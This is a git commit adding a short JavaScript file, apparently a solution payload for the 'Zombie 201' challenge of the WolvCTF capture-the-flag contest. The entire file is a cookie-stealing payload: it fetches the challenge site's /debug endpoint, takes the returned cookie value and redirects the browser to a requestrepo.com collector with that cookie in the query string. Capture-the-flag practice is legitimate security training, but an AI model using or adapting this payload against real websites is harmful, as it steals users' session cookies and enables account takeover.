3268b4f62f21e760135b62563ddd17b7e70298ec
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2023-03-21 04:02:04 +0700

    Create WOLVCTF_ZOMBIE_201.js

---
+++ WOLVCTF_ZOMBIE_201.js
@@ -0,0 +1,5 @@
+fetch("https://zombie-201-tlejfksioa-ul.a.run.app/debug").then(function(response) {
+    return response.json();
+}).then(function(data) {
+    window.location.href = "http://yotdlceq.requestrepo.com/?c=".concat(data['cookie']);
+})
